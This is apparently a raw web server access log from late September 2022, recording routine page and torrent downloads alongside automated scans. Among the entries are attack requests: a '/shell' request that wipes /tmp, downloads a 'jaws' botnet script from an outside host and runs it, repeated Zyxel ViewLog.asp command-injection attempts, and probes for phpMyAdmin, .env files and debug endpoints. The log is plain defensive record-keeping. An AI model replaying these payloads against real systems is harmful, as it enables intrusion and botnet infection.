43.142.186.224 - - [29/Sep/2022:12:35:18 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
90.151.171.106 - - [29/Sep/2022:12:37:30 +0300] "CONNECT api.ipify.org:443 HTTP/1.1" 400 157 "-" "-"
90.151.171.106 - - [29/Sep/2022:12:37:36 +0300] "\x04\x01\x00P\x03\xDC9\xE00\x00" 400 157 "-" "-"
90.151.171.106 - - [29/Sep/2022:12:37:42 +0300] "GET http://api.ipify.org/?Z78075847831Q1 HTTP/1.1" 200 3320 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [29/Sep/2022:12:37:45 +0300] "\x05\x01\x00" 400 157 "-" "-"
80.94.92.239 - - [29/Sep/2022:12:40:28 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
128.14.209.162 - - [29/Sep/2022:13:15:53 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
159.89.189.248 - - [29/Sep/2022:13:19:07 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
159.89.189.248 - - [29/Sep/2022:13:19:07 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "http://82.179.90.12/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
5.181.80.56 - - [29/Sep/2022:13:19:46 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
5.181.80.56 - - [29/Sep/2022:13:19:46 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/myadmin/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/pma/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/db/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/mysql/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:08 +0300] "GET http://82.179.90.12:80/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
42.236.120.51 - - [29/Sep/2022:13:41:09 +0300] "GET http://82.179.90.12:80/mysqladmin/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
196.188.76.154 - - [29/Sep/2022:14:00:18 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
196.188.76.154 - - [29/Sep/2022:14:00:18 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
176.58.124.134 - - [29/Sep/2022:14:13:06 +0300] "GET / HTTP/1.1" 400 157 "-" "-"
172.16.40.69 - - [29/Sep/2022:14:16:11 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
172.16.40.69 - - [29/Sep/2022:14:16:11 +0300] "GET /res2021.png HTTP/1.1" 200 69097 "http://82.179.90.12/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
172.16.40.69 - - [29/Sep/2022:14:16:11 +0300] "GET /res2020.png HTTP/1.1" 200 102730 "http://82.179.90.12/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
172.16.40.69 - - [29/Sep/2022:14:16:11 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "http://82.179.90.12/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
172.16.40.69 - - [29/Sep/2022:14:16:56 +0300] "GET /torrents HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
172.16.40.69 - - [29/Sep/2022:14:16:56 +0300] "GET /torrents/ HTTP/1.1" 200 734 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
80.95.44.54 - - [29/Sep/2022:14:17:14 +0300] "GET /torrents/ HTTP/1.1" 200 734 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.32 (Edition Yx GX)"
80.95.44.54 - - [29/Sep/2022:14:17:14 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://82.179.90.12/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.32 (Edition Yx GX)"
80.95.44.54 - - [29/Sep/2022:14:17:22 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "http://82.179.90.12/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.32 (Edition Yx GX)"
80.95.44.54 - - [29/Sep/2022:14:23:18 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "http://82.179.90.12/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.32 (Edition Yx GX)"
92.118.39.30 - - [29/Sep/2022:15:40:15 +0300] "\xF0\xDE\xBC" 400 157 "-" "-"
137.25.54.5 - - [29/Sep/2022:15:45:33 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
137.25.54.5 - - [29/Sep/2022:15:45:33 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
192.241.212.85 - - [29/Sep/2022:15:54:45 +0300] "MGLNDD_82.179.90.12_80" 400 157 "-" "-"
95.83.66.252 - - [29/Sep/2022:16:08:43 +0300] "GET /torrents/ HTTP/1.1" 200 734 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
95.83.66.252 - - [29/Sep/2022:16:08:43 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "http://82.179.90.12/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
95.83.66.252 - - [29/Sep/2022:16:08:54 +0300] "GET /torrents/files/bos03-Debian.ova.torrent HTTP/1.1" 200 117057 "http://82.179.90.12/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
77.88.5.221 - - [29/Sep/2022:16:09:09 +0300] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
167.71.41.128 - - [29/Sep/2022:17:05:59 +0300] "6\xAE5\x13&@\xF8\x1C\x01$JJ\x7FY7\x8A" 400 157 "-" "-"
167.71.41.128 - - [29/Sep/2022:17:05:59 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x9C\x18\xC6\xE3\xBF\x80K" 400 157 "-" "-"
167.71.41.128 - - [29/Sep/2022:17:05:59 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Y\xDE\xF4B\x8Bt\x22\x17\xFF6\xD8\x92\xDB\xE1_Uo\xD4\x82\xA5\xE1\xDD|\xF7\xF3$\x80qai\x15q\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
167.71.41.128 - - [29/Sep/2022:17:05:59 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
79.126.108.195 - - [29/Sep/2022:17:52:22 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.61.187.100 - - [29/Sep/2022:18:26:16 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
167.71.41.128 - - [29/Sep/2022:18:30:32 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Y~\xB3\xA1Q\xAC\x1B\x9D#B\x08\xB6\xA3 \x13O\xC0\x12\xC7\xF4\x92Y\xEA\xF8\xF8\x886*\xC3<\xA6\x8E\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
167.71.41.128 - - [29/Sep/2022:18:30:32 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xE1\x0E\xC2\xC7\x80\x1F\x13C\xE6\xD7\xA30\xCF\x95P3\x86\xE8f\xA5\x02\xFE\x9E+\x07\xE98\xFBz\x90C\xF9\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
167.71.41.128 - - [29/Sep/2022:18:30:32 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
111.59.229.15 - - [29/Sep/2022:18:53:42 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+botnet.psscc.cn/jaws;sh+/tmp/jaws HTTP/1.1" 404 153 "-" "Hello, world"
5.181.80.165 - - [29/Sep/2022:19:01:07 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
5.181.80.165 - - [29/Sep/2022:19:01:07 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
80.94.92.239 - - [29/Sep/2022:19:11:42 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
59.187.205.166 - - [29/Sep/2022:19:39:32 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
59.187.205.166 - - [29/Sep/2022:19:39:32 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
139.59.172.44 - - [29/Sep/2022:19:46:37 +0300] "\xD2\xEC\xDC\xA5Q_{HEE\xB7\xFCkY\x97\xA9" 400 157 "-" "-"
139.59.172.44 - - [29/Sep/2022:19:46:37 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xA6H\x82\xD4\x1D\x0C\xE9}\xAE\xF8G{J\x86\xF4za\xD7\xE7\x17s\x14\xB2}M\x85\xE5W\xBA\xFDG*\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
139.59.172.44 - - [29/Sep/2022:19:46:37 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xAD\xB6\xFC\x8C\xC4k\x84\x97\xA4\xBF#\x83rR\xA5\xAE\xD3\x89sPw\x0EOO7\xB1j\x84\xE9LS\xE5\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
139.59.172.44 - - [29/Sep/2022:19:46:37 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
167.248.133.60 - - [29/Sep/2022:19:50:49 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.60 - - [29/Sep/2022:19:50:49 +0300] "PRI * HTTP/2.0" 400 157 "-" "-"
167.248.133.60 - - [29/Sep/2022:19:50:50 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
35.233.62.116 - - [29/Sep/2022:20:23:31 +0300] "GET / HTTP/1.1" 200 1286 "-" "python-requests/2.28.1"
105.68.143.22 - - [29/Sep/2022:20:49:17 +0300] "GET /.env HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
105.68.143.22 - - [29/Sep/2022:20:49:18 +0300] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.198.153.19 - - [29/Sep/2022:20:52:31 +0300] "HEAD / HTTP/1.0" 200 0 "-" "-"
143.198.153.19 - - [29/Sep/2022:20:52:31 +0300] "GET /system_api.php HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.198.153.19 - - [29/Sep/2022:20:52:32 +0300] "GET /c/version.js HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.198.153.19 - - [29/Sep/2022:20:52:32 +0300] "GET /streaming/clients_live.php HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.198.153.19 - - [29/Sep/2022:20:52:33 +0300] "GET /stalker_portal/c/version.js HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.198.153.19 - - [29/Sep/2022:20:52:33 +0300] "GET /stream/live.php HTTP/1.1" 404 125 "-" "AlexaMediaPlayer/2.1.4676.0 (Linux;Android 5.1.1) ExoPlayerLib/1.5.9"
143.198.153.19 - - [29/Sep/2022:20:52:33 +0300] "GET /flu/403.html HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
143.198.153.19 - - [29/Sep/2022:20:52:34 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
150.255.123.8 - - [29/Sep/2022:20:59:00 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
150.255.123.8 - - [29/Sep/2022:20:59:00 +0300] "remoteSubmit=Save" 400 157 "-" "-"
172.104.138.223 - - [29/Sep/2022:22:13:08 +0300] "GET /fuN3 HTTP/1.0" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
151.106.32.179 - - [29/Sep/2022:22:24:12 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
151.106.32.179 - - [29/Sep/2022:22:24:13 +0300] "GET /HNAP1/ HTTP/1.1" 404 125 "http://82.179.90.12/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
80.94.92.231 - - [29/Sep/2022:23:00:57 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
5.181.80.133 - - [29/Sep/2022:23:23:03 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
5.181.80.133 - - [29/Sep/2022:23:23:03 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
128.1.248.42 - - [30/Sep/2022:00:11:04 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
80.94.92.239 - - [30/Sep/2022:00:35:34 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
61.0.64.216 - - [30/Sep/2022:00:57:04 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
183.136.225.35 - - [30/Sep/2022:01:30:25 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
152.89.196.211 - - [30/Sep/2022:01:32:49 +0300] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:05 +0300] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:07 +0300] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:09 +0300] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:13 +0300] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:16 +0300] "GET /db/webdb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:18 +0300] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:19 +0300] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:22 +0300] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:24 +0300] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:26 +0300] "GET /sql/websql/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:30 +0300] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:34 +0300] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:35 +0300] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:39 +0300] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:40 +0300] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:42 +0300] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:44 +0300] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:45 +0300] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:47 +0300] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:55 +0300] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:56 +0300] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:41:58 +0300] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:42:00 +0300] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:42:01 +0300] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:42:03 +0300] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
183.179.220.219 - - [30/Sep/2022:01:42:04 +0300] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
